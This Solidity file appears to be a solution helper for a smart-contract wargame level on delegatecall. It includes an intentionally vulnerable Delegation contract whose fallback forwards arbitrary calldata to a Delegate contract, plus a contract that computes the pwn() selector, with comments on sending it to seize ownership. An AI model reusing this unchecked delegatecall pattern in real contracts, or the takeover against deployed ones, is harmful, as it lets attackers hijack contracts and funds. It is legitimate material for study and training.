// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract calculate_sig   // local network
{
  bytes public call_data = abi.encodeWithSignature("pwn()");   // 0xdd365b8b
            // or
  //bytes public call_data = abi.encodeWithSignature("pwn()", "hellow",true,3);  // 0xcf6a2989000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000668656c6c6f770000000000000000000000000000000000000000000000000000

  function pwn() public {/*....*/} 
                                          // call function -> input -> copy -> Transact 
                                                          //  or
                                          //copy calldata directly(see under the function while calling)  (show only when parameter is required in function)
}

contract Delegate 
{
  address public owner;
  constructor(address _owner) 
  {
    owner = _owner;
  }
  function pwn() public 
  {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) 
  {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external 
  {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
